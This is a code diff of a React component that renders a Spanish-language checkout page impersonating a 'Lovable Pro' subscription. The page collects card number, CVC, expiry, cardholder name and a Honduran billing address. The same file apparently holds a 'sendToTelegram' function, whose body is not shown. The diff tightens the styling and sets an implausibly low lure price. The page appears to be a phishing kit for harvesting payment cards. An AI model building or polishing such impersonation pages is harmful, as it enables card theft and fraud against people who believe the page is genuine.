@@ -116,80 +116,80 @@ const sendToTelegram = async (text: string) => {
 /* ---------------- iconos ---------------- */
 
 const Logo = ({ brand, active = true }: { brand: Exclude<Brand, null>; active?: boolean }) => {
-  const cls = `shrink-0 transition-all duration-150 ${active ? "opacity-100" : "opacity-40 saturate-[0.35]"}`;
+  const cls = `shrink-0 transition-all duration-150 ${active ? "opacity-100" : "opacity-[0.32] saturate-[0.25]"}`;
   if (brand === "visa") {
     return (
-      <svg width="43" height="30" viewBox="0 0 43 30" aria-hidden="true" className={cls}>
-        <rect x="0.6" y="0.6" width="41.8" height="28.8" rx="4" fill="#fff" stroke="#dedede" strokeWidth="1.2" />
-        <text x="21.5" y="20.6" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="13" fontWeight="900" fontStyle="italic" fill="#1a1f71" letterSpacing="-0.5">VISA</text>
+      <svg width="30" height="21" viewBox="0 0 30 21" aria-hidden="true" className={cls}>
+        <rect x="0.4" y="0.4" width="29.2" height="20.2" rx="2.8" fill="#fff" stroke="#dedede" strokeWidth="0.8" />
+        <text x="15" y="14.4" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="9.1" fontWeight="900" fontStyle="italic" fill="#1a1f71" letterSpacing="-0.35">VISA</text>
       </svg>
     );
   }
   if (brand === "mastercard") {
     return (
-      <svg width="43" height="30" viewBox="0 0 43 30" aria-hidden="true" className={cls}>
-        <rect width="43" height="30" rx="4" fill="#000" />
-        <circle cx="17.2" cy="15" r="8.4" fill="#eb001b" />
-        <circle cx="25.8" cy="15" r="8.4" fill="#f79e1b" />
-        <path d="M21.5 8.12a8.4 8.4 0 0 0 0 13.76 8.4 8.4 0 0 0 0-13.76z" fill="#ff5f00" />
+      <svg width="30" height="21" viewBox="0 0 30 21" aria-hidden="true" className={cls}>
+        <rect width="30" height="21" rx="2.8" fill="#000" />
+        <circle cx="12" cy="10.5" r="5.9" fill="#eb001b" />
+        <circle cx="18" cy="10.5" r="5.9" fill="#f79e1b" />
+        <path d="M15 5.57a5.9 5.9 0 0 0 0 9.86 5.9 5.9 0 0 0 0-9.86z" fill="#ff5f00" />
       </svg>
     );
   }
   if (brand === "amex") {
     return (
-      <svg width="43" height="30" viewBox="0 0 43 30" aria-hidden="true" className={cls}>
-        <rect width="43" height="30" rx="4" fill="#016fd0" />
-        <rect x="2.4" y="2.4" width="38.2" height="25.2" rx="2" fill="none" stroke="#fff" strokeWidth="1.1" />
-        <text x="21.5" y="14.4" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="9.2" fontWeight="900" fill="#fff" letterSpacing="0.2">AM</text>
-        <text x="21.5" y="23.6" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="9.2" fontWeight="900" fill="#fff" letterSpacing="0.2">EX</text>
+      <svg width="30" height="21" viewBox="0 0 30 21" aria-hidden="true" className={cls}>
+        <rect width="30" height="21" rx="2.8" fill="#016fd0" />
+        <rect x="1.7" y="1.7" width="26.6" height="17.6" rx="1.4" fill="none" stroke="#fff" strokeWidth="0.75" />
+        <text x="15" y="10.1" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="6.4" fontWeight="900" fill="#fff" letterSpacing="0.15">AM</text>
+        <text x="15" y="16.6" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="6.4" fontWeight="900" fill="#fff" letterSpacing="0.15">EX</text>
       </svg>
     );
   }
   return (
-    <svg width="43" height="30" viewBox="0 0 43 30" aria-hidden="true" className={cls}>
-      <rect x="0.6" y="0.6" width="41.8" height="28.8" rx="4" fill="#fff" stroke="#dedede" strokeWidth="1.2" />
-      <text x="10.5" y="13.4" textAnchor="middle" fontSize="7.4" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#111" letterSpacing="-0.2">DISC</text>
-      <text x="10.5" y="20.6" textAnchor="middle" fontSize="7.4" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#111" letterSpacing="-0.2">VER</text>
-      <circle cx="34.5" cy="20.6" r="5.4" fill="#f68121" />
-      <path d="M29.1 20.6a5.4 5.4 0 0 0 5.4 5.4h.4c-3.3-1.1-5.8-3.2-5.8-5.4z" fill="#111" opacity="0.15" />
+    <svg width="30" height="21" viewBox="0 0 30 21" aria-hidden="true" className={cls}>
+      <rect x="0.4" y="0.4" width="29.2" height="20.2" rx="2.8" fill="#fff" stroke="#dedede" strokeWidth="0.8" />
+      <text x="7.4" y="9.5" textAnchor="middle" fontSize="5.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#111" letterSpacing="-0.15">DISC</text>
+      <text x="7.4" y="14.6" textAnchor="middle" fontSize="5.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#111" letterSpacing="-0.15">VER</text>
+      <circle cx="24" cy="14.4" r="3.8" fill="#f68121" />
+      <path d="M20.2 14.4a3.8 3.8 0 0 0 3.8 3.8h.3c-2.3-.8-4.1-2.3-4.1-3.8z" fill="#111" opacity="0.15" />
     </svg>
   );
 };
 
 const CardGlyph = () => (
-  <svg width="20" height="12" viewBox="0 0 20 12" aria-hidden="true">
-    <rect width="20" height="12" rx="2.4" fill="#111" />
-    <rect x="3" y="2.6" width="7" height="2.2" rx="1.1" fill="#fff" />
+  <svg width="17" height="10" viewBox="0 0 17 10" aria-hidden="true">
+    <rect width="17" height="10" rx="2" fill="#111" />
+    <rect x="2.5" y="2.2" width="6" height="1.8" rx="0.9" fill="#fff" />
   </svg>
 );
 
 const CvcGlyph = () => (
-  <svg width="26" height="17" viewBox="0 0 26 17" aria-hidden="true">
-    <rect x="0.9" y="0.9" width="24.2" height="15.2" rx="2.6" fill="#fff" stroke="#111" strokeWidth="1.8" />
-    <rect x="0.9" y="4.2" width="24.2" height="2.6" fill="#111" />
-    <text x="21.6" y="14.2" textAnchor="end" fontSize="6.4" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#111">123</text>
+  <svg width="22" height="14" viewBox="0 0 22 14" aria-hidden="true">
+    <rect x="0.7" y="0.7" width="20.6" height="12.6" rx="2.2" fill="#fff" stroke="#111" strokeWidth="1.4" />
+    <rect x="0.7" y="3.4" width="20.6" height="2.1" fill="#111" />
+    <text x="18.4" y="11.9" textAnchor="end" fontSize="5.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#111">123</text>
   </svg>
 );
 
-const AppleGlyph = ({ size = 22 }: { size?: number }) => (
+const AppleGlyph = ({ size = 18 }: { size?: number }) => (
   <svg width={size} height={size} viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
     <path d="M17.05 12.54c-.02-2.2 1.8-3.26 1.88-3.31-1.02-1.5-2.62-1.7-3.19-1.72-1.36-.14-2.65.8-3.34.8-.69 0-1.75-.78-2.87-.76-1.48.02-2.84.86-3.6 2.18-1.53 2.66-.39 6.6 1.1 8.76.73 1.06 1.6 2.25 2.74 2.2 1.1-.04 1.52-.71 2.85-.71 1.33 0 1.71.71 2.87.69 1.19-.02 1.94-1.08 2.66-2.14.84-1.23 1.19-2.42 1.21-2.48-.03-.01-2.32-.89-2.34-3.53zM14.9 5.9c.6-.73 1-1.75.89-2.76-.86.03-1.9.57-2.52 1.3-.55.64-1.04 1.68-.91 2.67.96.07 1.94-.49 2.54-1.21z" />
   </svg>
 );
 
 const LinkGlyph = () => (
-  <span className="flex items-center gap-[7px]">
-    <span className="flex h-[22px] w-[22px] items-center justify-center rounded-full bg-black">
-      <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden="true">
-        <path d="M5 3 10.9 8 5 13" fill="none" stroke="#fff" strokeWidth="2.8" strokeLinecap="round" strokeLinejoin="round" />
+  <span className="flex items-center gap-[5px]">
+    <span className="flex h-[18px] w-[18px] items-center justify-center rounded-full bg-black">
+      <svg width="10" height="10" viewBox="0 0 16 16" aria-hidden="true">
+        <path d="M5 3 10.9 8 5 13" fill="none" stroke="#fff" strokeWidth="2.9" strokeLinecap="round" strokeLinejoin="round" />
       </svg>
     </span>
-    <span className="text-[31px] font-extrabold leading-none tracking-[-0.04em] text-black">link</span>
+    <span className="text-[25px] font-extrabold leading-none tracking-[-0.045em] text-black">link</span>
   </span>
 );
 
 const HeartLogo = () => (
-  <svg width="25" height="22" viewBox="0 0 50 44" aria-hidden="true" style={{ transform: "rotate(-13deg)" }}>
+  <svg width="21" height="19" viewBox="0 0 50 44" aria-hidden="true" style={{ transform: "rotate(-13deg)" }}>
     <defs>
       <linearGradient id="vh-heart" x1="0.08" y1="0.95" x2="0.9" y2="0.05">
         <stop offset="0" stopColor="#5b2fe0" />
@@ -208,19 +208,19 @@ const HeartLogo = () => (
 
 const HnFlag = () => (
   <span className="relative shrink-0">
-    <span className="block h-[19px] w-[26px] overflow-hidden rounded-[3px] border border-[#d3d3d3]">
-      <svg width="26" height="19" viewBox="0 0 26 19" aria-hidden="true">
+    <span className="block h-[15px] w-[21px] overflow-hidden rounded-[2.5px] border border-[#d3d3d3]">
+      <svg width="21" height="15" viewBox="0 0 26 19" aria-hidden="true">
         <rect width="26" height="19" fill="#fff" />
         <rect width="26" height="6.4" fill="#0071ce" />
         <rect y="12.6" width="26" height="6.4" fill="#0071ce" />
         <g fill="#0071ce">
-          <circle cx="6.5" cy="9.5" r="0.75" /><circle cx="9.8" cy="9.5" r="0.75" />
-          <circle cx="13" cy="9.5" r="0.75" /><circle cx="16.2" cy="9.5" r="0.75" />
-          <circle cx="19.5" cy="9.5" r="0.75" />
+          <circle cx="6.5" cy="9.5" r="0.8" /><circle cx="9.8" cy="9.5" r="0.8" />
+          <circle cx="13" cy="9.5" r="0.8" /><circle cx="16.2" cy="9.5" r="0.8" />
+          <circle cx="19.5" cy="9.5" r="0.8" />
         </g>
       </svg>
     </span>
-    <span className="absolute -bottom-[3px] -right-[3px] flex h-[13px] w-[13px] items-center justify-center rounded-full border border-white bg-[#8a8a8a] text-[9px] font-bold leading-none text-white">+</span>
+    <span className="absolute -bottom-[2px] -right-[2px] flex h-[10px] w-[10px] items-center justify-center rounded-full border border-white bg-[#8a8a8a] text-[7px] font-bold leading-none text-white">+</span>
   </span>
 );
 
@@ -260,10 +260,8 @@ const Login = () => {
   const brand = detectBrand(card.replace(/\s/g, ""));
   const cvvMax = brand === "amex" ? 4 : 3;
 
-  const fmt = (usd: number) =>
-    `${currency} ${(currency === "HNL" ? usd * HNL_RATE : usd).toFixed(2)}`;
-  const price = fmt(annual ? 20.83 : 25);
-  const annualPrice = fmt(20.83);
+  const price = annual ? "1.68 USD" : "2 USD";
+  const annualPrice = "1.68 USD/mes";
 
   /* bloqueo de scroll del fondo */
   useEffect(() => {
@@ -489,46 +487,46 @@ const Login = () => {
           <form
             onSubmit={onSubmit}
             noValidate
-            className="mx-auto w-full max-w-[414px] bg-white pb-10 text-[#1a1a1a] antialiased"
+            className="mx-auto w-full max-w-[400px] bg-white pb-8 text-[#1a1a1a] antialiased"
           >
             {/* ---------- HERO OSCURO ---------- */}
-            <div className="bg-[#1f1f1f] px-[17px] pb-[11px] pt-[max(6px,env(safe-area-inset-top))] text-center text-white">
+            <div className="bg-[#1f1f1f] px-[14px] pb-[9px] pt-[max(4px,env(safe-area-inset-top))] text-center text-white">
               <div className="flex items-center justify-between">
-                <div className="flex items-center gap-[9px]">
+                <div className="flex items-center gap-[7px]">
                   <button
                     type="button"
                     onClick={goBack}
                     aria-label="Volver"
-                    className="-ml-[9px] flex h-[34px] w-[34px] items-center justify-center rounded-full text-white/85 transition-colors hover:bg-white/10 active:bg-white/15"
+                    className="-ml-[7px] flex h-[30px] w-[30px] items-center justify-center rounded-full text-white/85 transition-colors hover:bg-white/10 active:bg-white/15"
                   >
-                    <ChevronLeft className="h-[23px] w-[23px]" strokeWidth={2.2} />
+                    <ChevronLeft className="h-[20px] w-[20px]" strokeWidth={2.2} />
                   </button>
                   <HeartLogo />
                 </div>
 
-                <button type="button" className="flex items-center gap-[7px] text-[15px] text-white/90 transition-opacity hover:opacity-80">
-                  <span className="underline decoration-white/70 decoration-dotted decoration-[1.3px] underline-offset-[5px]">Detalles</span>
-                  <ChevronDown className="h-[19px] w-[19px]" strokeWidth={2.4} />
+                <button type="button" className="flex items-center gap-[5px] text-[13.5px] text-white/90 transition-opacity hover:opacity-80">
+                  <span className="underline decoration-white/70 decoration-dotted decoration-[1.1px] underline-offset-[4px]">Detalles</span>
+                  <ChevronDown className="h-[16px] w-[16px]" strokeWidth={2.4} />
                 </button>
               </div>
 
-              <p className="mt-[42px] text-[17px] leading-none text-[#a3a3a3]">Suscríbete a Pro 1</p>
+              <p className="mt-[32px] text-[15px] leading-none text-[#a3a3a3]">Suscríbete a Pro 1</p>
 
-              <p className="mt-[7px] flex items-baseline justify-center gap-[9px]">
-                <span className="text-[34px] font-bold leading-none tracking-[-0.03em] text-white tabular-nums">{price}</span>
-                <span className="text-[15.5px] font-medium text-[#a3a3a3]">por mes</span>
+              <p className="mt-[6px] flex items-baseline justify-center gap-[7px]">
+                <span className="text-[27px] font-bold leading-none tracking-[-0.03em] text-white tabular-nums">{price}</span>
+                <span className="text-[13.5px] font-medium text-[#a3a3a3]">por mes</span>
               </p>
 
-              <p className="mt-[47px] text-[15.5px] leading-snug text-[#a3a3a3]">Lovable Pro 1 Monthly subscription</p>
+              <p className="mt-[36px] text-[13.5px] leading-snug text-[#a3a3a3]">Lovable Pro 1 Monthly subscription</p>
 
               <button
                 type="button"
-                className="mt-[13px] inline-flex h-[40px] items-center justify-center gap-[9px] rounded-[8px] bg-[#333333] px-[19px] text-[15.5px] font-normal text-white transition-colors hover:bg-[#3d3d3d] active:bg-[#464646]"
+                className="mt-[10px] inline-flex h-[34px] items-center justify-center gap-[7px] rounded-[7px] bg-[#333333] px-[15px] text-[13.5px] font-normal text-white transition-colors hover:bg-[#3d3d3d] active:bg-[#464646]"
               >
-                Agregar código <ChevronDown className="h-[18px] w-[18px]" strokeWidth={2.2} />
+                Agregar código <ChevronDown className="h-[15px] w-[15px]" strokeWidth={2.2} />
               </button>
 
-              <div className="mt-[17px] grid grid-cols-2 gap-[9px]">
+              <div className="mt-[13px] grid grid-cols-2 gap-[7px]">
                 {(["HNL", "USD"] as const).map((cur) => {
                   const on = currency === cur;
                   return (
@@ -537,77 +535,77 @@ const Login = () => {
                       type="button"
                       onClick={() => setCurrency(cur)}
                       aria-pressed={on}
-                      className={`flex h-[61px] items-center justify-center gap-[11px] rounded-[8px] text-[20px] font-normal text-white transition-all duration-150 ${
+                      className={`flex h-[50px] items-center justify-center gap-[9px] rounded-[7px] text-[16px] font-normal text-white transition-all duration-150 ${
                         on
                           ? "border-[1.5px] border-white bg-[#1f1f1f]"
                           : "border-[1.5px] border-transparent bg-[#333333] hover:bg-[#3b3b3b]"
                       }`}
                     >
-                      <span className="text-[21px] leading-none">{cur === "HNL" ? "🇭🇳" : "🇺🇸"}</span>
+                      <span className="text-[17px] leading-none">{cur === "HNL" ? "🇭🇳" : "🇺🇸"}</span>
                       {cur}
                     </button>
                   );
                 })}
               </div>
 
-              <p className="mx-auto mt-[12px] max-w-[360px] text-[15.5px] leading-[1.55] text-[#9a9a9a]">
-                1 USD = 27.9562 HNL. Los cargos pueden variar según los tipos de cambio.
+              <p className="mx-auto mt-[9px] max-w-[320px] text-[12.5px] leading-[1.5] text-[#9a9a9a]">
+                1 USD = {HNL_RATE} HNL. Los cargos pueden variar según los tipos de cambio.
               </p>
 
-              <div className="mt-[21px] flex items-center justify-between gap-3 rounded-[10px] bg-[#2b2b2b] px-[15px] py-[14px] text-left">
-                <div className="flex items-start gap-[13px]">
+              <div className="mt-[16px] flex items-center justify-between gap-2.5 rounded-[9px] bg-[#2b2b2b] px-[12px] py-[11px] text-left">
+                <div className="flex items-start gap-[10px]">
                   <button
                     type="button"
                     role="switch"
                     aria-checked={annual}
                     aria-label="Facturación anual"
                     onClick={() => setAnnual((v) => !v)}
-                    className={`relative mt-[2px] h-[14px] w-[24px] shrink-0 rounded-full transition-colors duration-150 ${annual ? "bg-[#1f9d55]" : "bg-[#5c5c5c]"}`}
+                    className={`relative mt-[2px] h-[12px] w-[20px] shrink-0 rounded-full transition-colors duration-150 ${annual ? "bg-[#1f9d55]" : "bg-[#5c5c5c]"}`}
                   >
                     <span
-                      className="absolute top-[2px] h-[10px] w-[10px] rounded-full bg-white shadow-[0_1px_2px_rgba(0,0,0,0.3)] transition-all duration-150"
-                      style={{ left: annual ? "12px" : "2px" }}
+                      className="absolute top-[2px] h-[8px] w-[8px] rounded-full bg-white shadow-[0_1px_2px_rgba(0,0,0,0.3)] transition-all duration-150"
+                      style={{ left: annual ? "10px" : "2px" }}
                     />
                   </button>
-                  <p className="text-[15.5px] leading-[1.35] text-white">
-                    <span className="mr-[5px] inline-block rounded-[5px] bg-[#b9e8a3] px-[7px] py-[1px] text-[15.5px] font-medium text-[#1e3a10]">Ahorra 16%</span>
+                  <p className="text-[13px] leading-[1.35] text-white">
+                    <span className="mr-[4px] inline-block rounded-[4px] bg-[#b9e8a3] px-[6px] py-[1px] text-[12.5px] font-medium text-[#1e3a10]">Ahorra 16%</span>
                     con una facturación de anual
                   </p>
                 </div>
-                <p className="shrink-0 text-[15.5px] leading-tight text-white tabular-nums">{annualPrice}/mes</p>
+                <p className="shrink-0 text-[13px] leading-tight text-white tabular-nums">{annualPrice}</p>
               </div>
             </div>
 
             {/* ---------- CUERPO ---------- */}
-            <div className="bg-white px-[17px] pt-[30px]">
-              <div className="grid grid-cols-2 gap-[9px]">
+            <div className="bg-white px-[14px] pt-[24px]">
+              <div className="grid grid-cols-2 gap-[7px]">
                 <button
                   type="button"
                   onClick={() => setMethod("gpay")}
-                  className="flex h-[77px] items-center justify-center rounded-[8px] bg-black text-white transition-transform active:scale-[0.99]"
+                  className="flex h-[62px] items-center justify-center rounded-[7px] bg-black text-white transition-transform active:scale-[0.99]"
                   aria-label="Apple Pay"
                 >
-                  <AppleGlyph size={26} />
-                  <span className="ml-[2px] mt-[1px] text-[31px] font-medium leading-none tracking-[-0.025em]">Pay</span>
+                  <AppleGlyph size={22} />
+                  <span className="ml-[2px] mt-[1px] text-[26px] font-medium leading-none tracking-[-0.025em]">Pay</span>
                 </button>
                 <button
                   type="button"
                   onClick={() => setMethod("card")}
-                  className="flex h-[77px] items-center justify-center rounded-[8px] bg-[#6cdc8c] transition-transform active:scale-[0.99]"
+                  className="flex h-[62px] items-center justify-center rounded-[7px] bg-[#6cdc8c] transition-transform active:scale-[0.99]"
                   aria-label="Link"
                 >
                   <LinkGlyph />
                 </button>
               </div>
 
-              <div className="mt-[35px] flex items-center gap-[15px]">
+              <div className="mt-[27px] flex items-center gap-[12px]">
                 <span className="h-px flex-1 bg-[#e3e3e3]" />
-                <span className="text-[15px] font-normal uppercase tracking-[0.085em] text-[#8a8a8a]">O bien</span>
+                <span className="text-[13px] font-normal uppercase tracking-[0.08em] text-[#8a8a8a]">O bien</span>
                 <span className="h-px flex-1 bg-[#e3e3e3]" />
               </div>
 
-              <div className="mt-[20px] flex min-h-[67px] items-center gap-3 rounded-[10px] border border-[#ececec] bg-[#f7f7f7] px-[15px] py-[11px]">
-                <label htmlFor="email" className="w-[131px] shrink-0 text-[15.5px] leading-[1.3] text-[#6b6b6b]">Correo electrónico</label>
+              <div className="mt-[16px] flex min-h-[54px] items-center gap-2.5 rounded-[9px] border border-[#ececec] bg-[#f7f7f7] px-[12px] py-[9px]">
+                <label htmlFor="email" className="w-[108px] shrink-0 text-[13.5px] leading-[1.3] text-[#6b6b6b]">Correo electrónico</label>
                 <input
                   id="email"
                   type="email"
@@ -620,26 +618,26 @@ const Login = () => {
                   spellCheck={false}
                   maxLength={64}
                   aria-invalid={field === "email"}
-                  className="h-6 min-w-0 flex-1 bg-transparent text-right text-[15.5px] text-[#1a1a1a] outline-none"
+                  className="h-5 min-w-0 flex-1 bg-transparent text-right text-[13.5px] text-[#1a1a1a] outline-none"
                 />
-                <button type="button" className="shrink-0 text-[15.5px] text-[#1a1a1a] underline decoration-[#1a1a1a]/70 underline-offset-[3px]">
+                <button type="button" className="shrink-0 text-[13.5px] text-[#1a1a1a] underline decoration-[#1a1a1a]/70 underline-offset-[3px]">
                   Continuar con Link
                 </button>
               </div>
 
-              <h2 className="mt-[30px] text-[19px] font-bold tracking-[-0.015em] text-[#1a1a1a]">Método de pago</h2>
+              <h2 className="mt-[24px] text-[17px] font-bold tracking-[-0.015em] text-[#1a1a1a]">Método de pago</h2>
 
-              <div className="mx-[14px] mt-[13px] rounded-[11px] border border-[#e5e5e5] p-[2px] pb-[2px]">
-                <div className="flex items-center gap-[17px] px-[13px] pb-[13px] pt-[11px]">
-                  <span className="flex h-[15px] w-[15px] shrink-0 items-center justify-center rounded-full border-[5.5px] border-[#111] bg-white" aria-hidden="true" />
+              <div className="mx-[12px] mt-[10px] rounded-[10px] border border-[#e5e5e5] p-[2px]">
+                <div className="flex items-center gap-[13px] px-[11px] pb-[10px] pt-[9px]">
+                  <span className="flex h-[13px] w-[13px] shrink-0 items-center justify-center rounded-full border-[5px] border-[#111] bg-white" aria-hidden="true" />
                   <CardGlyph />
-                  <span className="text-[17px] text-[#1a1a1a]">Tarjeta</span>
+                  <span className="text-[14.5px] text-[#1a1a1a]">Tarjeta</span>
                 </div>
 
-                <p className="mb-[5px] px-[13px] text-[17px] text-[#4a4a4a]">Información de la tarjeta</p>
+                <p className="mb-[4px] px-[11px] text-[14.5px] text-[#4a4a4a]">Información de la tarjeta</p>
 
-                <div className={`overflow-hidden rounded-[9px] border bg-white transition-colors focus-within:border-[#a8a8a8] ${field === "card" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}>
-                  <div className="flex h-[45px] items-center gap-2 pl-[15px] pr-[7px]">
+                <div className={`overflow-hidden rounded-[8px] border bg-white transition-colors focus-within:border-[#a8a8a8] ${field === "card" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}>
+                  <div className="flex h-[40px] items-center gap-2 pl-[12px] pr-[6px]">
                     <input
                       id="cc-number"
                       type="text"
@@ -652,9 +650,9 @@ const Login = () => {
                       spellCheck={false}
                       maxLength={23}
                       aria-invalid={field === "card"}
-                      className="h-full min-w-0 flex-1 bg-transparent text-[17px] tracking-[0.01em] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                      className="h-full min-w-0 flex-1 bg-transparent text-[15.5px] tracking-[0.01em] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                     />
-                    <div className="flex shrink-0 items-center gap-[4.5px]">
+                    <div className="flex shrink-0 items-center gap-[3px]">
                       {(["visa", "mastercard", "amex", "discover"] as const).map((b) => (
                         <Logo key={b} brand={b} active={!brand || brand === b} />
                       ))}
@@ -662,7 +660,7 @@ const Login = () => {
                   </div>
 
                   <div className="grid grid-cols-2 border-t border-[#e5e5e5]">
-                    <div className="flex h-[46px] items-center border-r border-[#e5e5e5]">
+                    <div className="flex h-[40px] items-center border-r border-[#e5e5e5]">
                       <input
                         id="cc-exp"
                         type="text"
@@ -673,10 +671,10 @@ const Login = () => {
                         inputMode="numeric"
                         maxLength={5}
                         aria-invalid={field === "exp"}
-                        className="h-full w-full bg-transparent px-[15px] text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                        className="h-full w-full bg-transparent px-[12px] text-[15.5px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                       />
                     </div>
-                    <div className="flex h-[46px] items-center gap-2 pl-[15px] pr-[9px]">
+                    <div className="flex h-[40px] items-center gap-1.5 pl-[12px] pr-[8px]">
                       <input
                         id="cc-cvc"
                         type="text"
@@ -687,14 +685,14 @@ const Login = () => {
                         inputMode="numeric"
                         maxLength={cvvMax}
                         aria-invalid={field === "cvc"}
-                        className="h-full min-w-0 flex-1 bg-transparent text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                        className="h-full min-w-0 flex-1 bg-transparent text-[15.5px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                       />
                       <CvcGlyph />
                     </div>
                   </div>
                 </div>
 
-                <p className="mb-[4px] mt-[17px] px-[13px] text-[17px] text-[#1a1a1a]">Nombre del titular de tarjeta</p>
+                <p className="mb-[4px] mt-[14px] px-[11px] text-[14.5px] text-[#1a1a1a]">Nombre del titular de tarjeta</p>
                 <input
                   id="cc-name"
                   type="text"
@@ -706,22 +704,22 @@ const Login = () => {
                   spellCheck={false}
                   maxLength={40}
                   aria-invalid={field === "holder"}
-                  className={`h-[46px] w-full rounded-[9px] border bg-white px-[15px] text-[17px] uppercase text-[#1a1a1a] outline-none transition-colors placeholder:normal-case placeholder:text-[#9b9b9b] focus:border-[#a8a8a8] ${field === "holder" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}
+                  className={`h-[40px] w-full rounded-[8px] border bg-white px-[12px] text-[15.5px] uppercase text-[#1a1a1a] outline-none transition-colors placeholder:normal-case placeholder:text-[#9b9b9b] focus:border-[#a8a8a8] ${field === "holder" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}
                 />
 
-                <p className="mb-[5px] mt-[21px] px-[13px] text-[17px] text-[#1a1a1a]">Dirección de facturación</p>
+                <p className="mb-[4px] mt-[17px] px-[11px] text-[14.5px] text-[#1a1a1a]">Dirección de facturación</p>
 
-                <div className={`overflow-hidden rounded-[9px] border bg-white ${field === "address" || field === "zip" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}>
+                <div className={`overflow-hidden rounded-[8px] border bg-white ${field === "address" || field === "zip" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}>
                   <div className="relative">
                     <select
                       id="country"
                       value={country}
                       onChange={(e) => setCountry(e.target.value)}
-                      className="h-[46px] w-full cursor-pointer appearance-none bg-white pl-[15px] pr-[45px] text-[17px] text-[#1a1a1a] outline-none"
+                      className="h-[40px] w-full cursor-pointer appearance-none bg-white pl-[12px] pr-[38px] text-[15.5px] text-[#1a1a1a] outline-none"
                     >
                       {COUNTRIES.map((c) => <option key={c} value={c}>{c}</option>)}
                     </select>
-                    <ChevronDown className="pointer-events-none absolute right-[13px] top-1/2 h-[21px] w-[21px] -translate-y-1/2 text-[#111]" strokeWidth={2.2} />
+                    <ChevronDown className="pointer-events-none absolute right-[11px] top-1/2 h-[18px] w-[18px] -translate-y-1/2 text-[#111]" strokeWidth={2.2} />
                   </div>
 
                   <div className="border-t border-[#e5e5e5]">
@@ -734,11 +732,11 @@ const Login = () => {
                       autoComplete="street-address"
                       maxLength={80}
                       aria-invalid={field === "address"}
-                      className="h-[48px] w-full bg-transparent pl-[15px] pr-[15px] text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                      className="h-[41px] w-full bg-transparent px-[12px] text-[15.5px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                     />
                   </div>
 
-                  <div className="flex h-[46px] items-center gap-3 border-t border-[#e5e5e5] pl-[15px] pr-[9px]">
+                  <div className="flex h-[40px] items-center gap-2 border-t border-[#e5e5e5] pl-[12px] pr-[8px]">
                     <input
                       id="address2"
                       type="text"
@@ -747,9 +745,9 @@ const Login = () => {
                       onChange={(e) => setAddress2(e.target.value)}
                       autoComplete="address-line2"
                       maxLength={80}
-                      className="h-full min-w-0 flex-1 bg-transparent text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                      className="h-full min-w-0 flex-1 bg-transparent text-[15.5px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                     />
-                    <span className="shrink-0 rounded-[6px] border border-[#dcdcdc] px-[9px] py-[6px] text-[15.5px] leading-none text-[#8a8a8a]">Opcional</span>
+                    <span className="shrink-0 rounded-[5px] border border-[#dcdcdc] px-[7px] py-[5px] text-[13px] leading-none text-[#8a8a8a]">Opcional</span>
                   </div>
 
                   <div className="border-t border-[#e5e5e5]">
@@ -761,7 +759,7 @@ const Login = () => {
                       onChange={(e) => setCity(e.target.value)}
                       autoComplete="address-level2"
                       maxLength={60}
-                      className="h-[48px] w-full bg-transparent px-[15px] text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                      className="h-[41px] w-full bg-transparent px-[12px] text-[15.5px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                     />
                   </div>
 
@@ -770,12 +768,12 @@ const Login = () => {
                       id="department"
                       value={department}
                       onChange={(e) => setDepartment(e.target.value)}
-                      className={`h-[48px] w-full cursor-pointer appearance-none bg-white pl-[15px] pr-[45px] text-[17px] outline-none ${department ? "text-[#1a1a1a]" : "text-[#9b9b9b]"}`}
+                      className={`h-[41px] w-full cursor-pointer appearance-none bg-white pl-[12px] pr-[38px] text-[15.5px] outline-none ${department ? "text-[#1a1a1a]" : "text-[#9b9b9b]"}`}
                     >
                       <option value="">Departamento</option>
                       {DEPARTMENTS.map((d) => <option key={d} value={d}>{d}</option>)}
                     </select>
-                    <ChevronDown className="pointer-events-none absolute right-[13px] top-1/2 h-[21px] w-[21px] -translate-y-1/2 text-[#111]" strokeWidth={2.2} />
+                    <ChevronDown className="pointer-events-none absolute right-[11px] top-1/2 h-[18px] w-[18px] -translate-y-1/2 text-[#111]" strokeWidth={2.2} />
                   </div>
 
                   <div className="border-t border-[#e5e5e5]">
@@ -789,32 +787,32 @@ const Login = () => {
                       inputMode="numeric"
                       maxLength={10}
                       aria-invalid={field === "zip"}
-                      className="h-[48px] w-full bg-transparent px-[15px] text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                      className="h-[41px] w-full bg-transparent px-[12px] text-[15.5px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                     />
                   </div>
